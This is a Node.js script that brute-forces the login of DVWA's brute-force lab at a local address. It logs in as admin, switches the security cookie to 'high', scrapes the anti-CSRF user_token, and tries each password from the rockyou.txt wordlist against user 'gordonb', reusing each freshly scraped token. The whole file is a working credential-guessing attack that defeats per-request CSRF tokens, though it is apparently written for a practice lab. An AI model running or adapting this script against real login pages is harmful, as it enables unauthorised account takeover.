const request = require("request")
const cheerio = require('cheerio')
const fs = require('fs');
const ip = `192.168.1.116`
const loginUsername = 'admin'
const loginPassword = 'password'
const loginUrl = `http://${ip}:8080/login.php`

const url = `http://${ip}:8080/vulnerabilities/brute/`
const targetUser = 'gordonb'
const filePath = 'rockyou.txt'
const successMsg = `Welcome to the password protected area ${targetUser}`

const openPagelogin = (url) => {
    return new Promise((resolve, rejects) => {
        request({
            url: url,
            method: 'GET',
        }, (err, res, body) => {
            const phpid = res.headers['set-cookie'][0].replace('path=/', '')
            const securityHigh = res.headers['set-cookie'][res.headers['set-cookie'].length - 1].replace('low', 'high')
            const scrap = cheerio.load(body)
            const user_token = scrap('input[name="user_token"]').val()
            const sessions = {
                phpid: phpid,
                securityHigh: securityHigh,
                userToken: user_token
            }
            resolve(sessions)
        })
    })
}

const loginAction = (sessions, username, password) => {
    return new Promise((resolve, rejects) => {
        request({
            url: loginUrl,
            method: 'post',
            headers: {
                Cookie: `${sessions.phpid} ${sessions.securityHigh}`
            },
            form: {
                username: username,
                password: password,
                user_token: sessions.userToken,
                Login: `Login`
            }
        }, (err, res, body) => {
            resolve(body)
        })
    })
}

const gotoBFPage = (url, sessions) => {
    return new Promise((resolve, rejects) => {
        request({
            url: url,
            method: 'get',
            headers: {
                Cookie: `${sessions.phpid} ${sessions.securityHigh}`
            },
        }, (err, res, body) => {
            const scrap = cheerio.load(body)
            const hacking_user_token = scrap('input[name="user_token"]').val()
            resolve(hacking_user_token)
        })
    })
}

const BruteForce = (url, targetUser, password, sessions, token) => {
    return new Promise((resolve, rejects) => {
        params = `${url}?username=${targetUser}&password=${password}&user_token=${token}&Login=Login`
        const options = {
            url: params,
            method: 'get',
            headers: {
                Cookie: `${sessions.phpid} ${sessions.securityHigh}`
            },
        }
        request(options, (err, res, body) => {
            const scrap = cheerio.load(body)
            hacking_user_token = scrap('input[name="user_token"]').val()
            const p = scrap('p').text().replace('Damn Vulnerable Web Application (DVWA) v1.10 *Development*', '')
            let result = {
                targetUser: targetUser,
                password: password,
                found: false,
                msg: '',
                userToken: hacking_user_token
            }
            if (p === successMsg) {
                result.found = true
                result.msg = p
            } else {
                result.userToken = hacking_user_token
            }
            resolve(result)
        })
    })
}

const randomPassword = (url, sessions, password, token) => {
    return new Promise(async (resolve, rejects) => {
        const r = await BruteForce(url, targetUser, password, sessions, token)
        resolve(r)
    })

}

const run = async () => {
    const sessions = await openPagelogin(loginUrl)
    await loginAction(sessions, loginUsername, loginPassword)
    let token = await gotoBFPage(url, sessions)
    const data = fs.readFileSync(filePath, 'UTF-8')
    const lines = data.split(/\r?\n/);
    for (const password of lines) {
        const r = await randomPassword(url, sessions, password, token)
        console.log(`try username ${targetUser} password ${password}`)
        if (r.found) {
            console.log(r)
            break
        }
        token = r.userToken
    }
}

run()
